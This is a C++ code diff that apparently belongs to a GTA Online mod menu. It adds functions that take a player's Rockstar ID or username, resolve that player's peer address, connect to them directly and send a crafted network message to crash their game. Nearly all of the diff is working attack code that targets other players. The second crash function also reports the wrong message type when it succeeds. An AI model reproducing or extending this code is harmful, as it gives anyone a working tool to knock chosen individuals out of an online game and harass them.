@@ -236,6 +236,126 @@ namespace big::session
 		g_notification_service->push("RID Kick", "Sent lost connection kick");
 	}
 
+	inline void crash_by_rockstar_id(uint64_t rid)
+	{
+		rage::rlGamerHandle player_handle(rid);
+		rage::rlScHandle socialclub_handle(rid);
+
+		rage::snConnectToPeerTaskData connect_to_peer_data{};
+		rage::snConnectToPeerTaskResult connect_to_peer_result{};
+		rage::rlTaskStatus connect_to_peer_status{};
+
+		rage::rlQueryPresenceAttributesContext query_presence_attributes_context{};
+		rage::rlTaskStatus query_presence_attributes_status{};
+		rage::rlGamerInfoBase peer_address{};
+
+		query_presence_attributes_context.m_presence_attibute_type = 3; // string
+		strcpy(query_presence_attributes_context.m_presence_attribute_key, "peeraddr");
+
+		if (!g_pointers->m_start_get_presence_attributes(0, &socialclub_handle, &query_presence_attributes_context, 1, &query_presence_attributes_status))
+		{
+			g_notification_service->push_error("RID Crash", "Cannot start the query presence attributes rline task");
+			return;
+		}
+
+		while (query_presence_attributes_status.status == 1)
+			script::get_current()->yield();
+
+		if (query_presence_attributes_status.status != 3)
+		{
+			g_notification_service->push_error("RID Crash", "Querying presence attributes failed");
+			return;
+		}
+
+		connect_to_peer_data.m_unk = 0;
+		connect_to_peer_data.m_reason = 5;
+		connect_to_peer_data.m_session_token = 0;
+
+		g_pointers->m_decode_peer_info(&peer_address, query_presence_attributes_context.m_presence_attribute_value, nullptr);
+
+		if (!g_pointers->m_connect_to_peer(gta_util::get_network()->m_game_session.m_net_connection_mgr, &peer_address, &connect_to_peer_data, &connect_to_peer_result, &connect_to_peer_status))
+		{
+			g_notification_service->push_error("RID Crash", "Failed to start a connection with player");
+			return;
+		}
+
+		g_notification_service->push("RID Crash", "Connecting to player...");
+
+		while (connect_to_peer_status.status == 1)
+			script::get_current()->yield();
+
+		if (connect_to_peer_status.status != 3)
+		{
+			g_notification_service->push_error("RID Crash", "Failed to connect to player");
+			return;
+		}
+
+		packet msg;
+		msg.write_message(rage::eNetMessage::MsgTransitionLaunch);
+		msg.send(connect_to_peer_result.m_peer_id, 7);
+		g_notification_service->push("RID Crash", "Sent transition launch crash");
+	}
+
+	inline void crash_by_rockstar_id2(uint64_t rid)
+	{
+		rage::rlGamerHandle player_handle(rid);
+		rage::rlScHandle socialclub_handle(rid);
+
+		rage::snConnectToPeerTaskData connect_to_peer_data{};
+		rage::snConnectToPeerTaskResult connect_to_peer_result{};
+		rage::rlTaskStatus connect_to_peer_status{};
+
+		rage::rlQueryPresenceAttributesContext query_presence_attributes_context{};
+		rage::rlTaskStatus query_presence_attributes_status{};
+		rage::rlGamerInfoBase peer_address{};
+
+		query_presence_attributes_context.m_presence_attibute_type = 3; // string
+		strcpy(query_presence_attributes_context.m_presence_attribute_key, "peeraddr");
+
+		if (!g_pointers->m_start_get_presence_attributes(0, &socialclub_handle, &query_presence_attributes_context, 1, &query_presence_attributes_status))
+		{
+			g_notification_service->push_error("RID Crash", "Cannot start the query presence attributes rline task");
+			return;
+		}
+
+		while (query_presence_attributes_status.status == 1)
+			script::get_current()->yield();
+
+		if (query_presence_attributes_status.status != 3)
+		{
+			g_notification_service->push_error("RID Crash", "Querying presence attributes failed");
+			return;
+		}
+
+		connect_to_peer_data.m_unk = 0;
+		connect_to_peer_data.m_reason = 5;
+		connect_to_peer_data.m_session_token = 0;
+
+		g_pointers->m_decode_peer_info(&peer_address, query_presence_attributes_context.m_presence_attribute_value, nullptr);
+
+		if (!g_pointers->m_connect_to_peer(gta_util::get_network()->m_game_session.m_net_connection_mgr, &peer_address, &connect_to_peer_data, &connect_to_peer_result, &connect_to_peer_status))
+		{
+			g_notification_service->push_error("RID Crash", "Failed to start a connection with player");
+			return;
+		}
+
+		g_notification_service->push("RID Crash", "Connecting to player...");
+
+		while (connect_to_peer_status.status == 1)
+			script::get_current()->yield();
+
+		if (connect_to_peer_status.status != 3)
+		{
+			g_notification_service->push_error("RID Crash", "Failed to connect to player");
+			return;
+		}
+
+		packet msg;
+		msg.write_message(rage::eNetMessage::MsgBlacklist);
+		msg.send(connect_to_peer_result.m_peer_id, 7);
+		g_notification_service->push("RID Crash", "Sent transition launch crash");
+	}
+
 	inline void join_by_username(std::string username)
 	{
 		g_thread_pool->push([username]
@@ -268,6 +388,23 @@ namespace big::session
 			}
 			g_notification_service->push_error("RID Kick", "Target player is offline?");
 		});
+	}
+
+	inline void crash_by_username(std::string username)
+	{
+		g_thread_pool->push([username]
+			{
+				uint64_t rid;
+		if (g_api_service->get_rid_from_username(username, rid))
+		{
+			g_fiber_pool->queue_job([rid]
+				{
+					crash_by_rockstar_id(rid);
+				});
+			return;
+		}
+		g_notification_service->push_error("RID Crash", "Target player is offline?");
+			});
 	}
 
 	inline void add_infraction(player_ptr player, Infraction infraction)
